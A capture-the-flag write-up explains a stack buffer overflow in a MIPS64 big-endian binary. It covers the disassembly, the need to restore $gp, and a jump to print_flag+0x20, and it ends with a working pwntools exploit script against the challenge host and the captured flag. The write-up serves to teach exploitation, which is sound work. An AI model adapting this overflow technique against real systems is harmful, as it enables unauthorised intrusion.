#Pwn 
## 1. Binary Analysis
*   **Architecture**: MIPS64, Big Endian.
*   **Mitigations**: The binary is statically linked and compiled with position-independent code (PIC) features.
*   **Key Functions**:
    *   `send_command`: Reads up to 0x200 bytes of input into a stack buffer.
    *   `process_command`: Receives the input and its length, then performs a `memcpy` into a local buffer of approximately 0x40 bytes.
    *   `print_flag`: A function that reads and prints the flag from an environment variable or a default location.

## 2. Vulnerability Discovery
Disassembling `process_command` revealed the following:
```mips
0x120004608:    daddiu  $sp, $sp, -0x70
0x12000460c:    sd      $ra, 0x68($sp)
0x120004610:    sd      $fp, 0x60($sp)
0x120004614:    sd      $gp, 0x58($sp)
...
0x120004664:    ld      $a2, 0x48($fp)  # Length from read()
0x120004668:    ld      $a1, 0x40($fp)  # Source buffer
0x12000466c:    move    $a0, $fp        # Destination buffer (stack)
0x120004670:    ld      $v0, -0x7f10($gp) # memcpy
0x120004674:    move    $t9, $v0
0x120004678:    jalr    $t9
```
The function takes the user-provided length (up to 0x200 bytes) and copies it into a 0x70-byte stack frame. Since the return address (`$ra`) and Global Pointer (`$gp`) are stored at the end of this frame, we can overwrite them.

## 3. Exploitation Strategy
Exploiting MIPS PIC binaries requires special care for the `$gp` register. In MIPS, `$gp` is used to access the Global Offset Table (GOT). If we overwrite it with garbage, the program will crash during the `epilogue` or in the subsequent function calls.

1.  **Padding**: The distance to `$gp` is 0x58 bytes.
2.  **Restore $gp**: We must provide the correct `$gp` value (`0x1200B51C0`) so that the function can correctly load the flag-printing routines.
3.  **Skip GP Calculation**: The `print_flag` function starts with a sequence that calculates `$gp` based on `$t9` (the current function address).
    ```mips
    0x120003f94:    lui     $gp, 0xb
    0x120003f98:    daddu   $gp, $gp, $t9
    ```
    Since we are jumping via a return address overwrite and not a proper `jalr $t9`, `$t9` will not contain the address of `print_flag`, leading to an incorrect `$gp`. To fix this, we jump directly to `print_flag + 0x20`, skipping the internal `$gp` calculation and relying on the `$gp` we manually restored.

## 4. Exploit Script
```python
from pwn import *

host = "node-2.mcsc.space"
port = 11911

# Binary constants
gp_value = 0x1200B51C0
# Skip gp calculation in print_flag
target_addr = 0x120003f80 + 0x20
safe_fp = 0x1200B4000

# Overflow payload
payload = b"A" * 0x58
payload += p64(gp_value, endian='big')
payload += p64(safe_fp, endian='big')
payload += p64(target_addr, endian='big')

r = remote(host, port)
r.sendlineafter(b">>> ", b"3") # Send Command
r.sendlineafter(b">>> ", payload)
print(r.recvall().decode())
```

## 5. Flag
`esch{exploitability-is-environmental-viper-lunar-6675}`
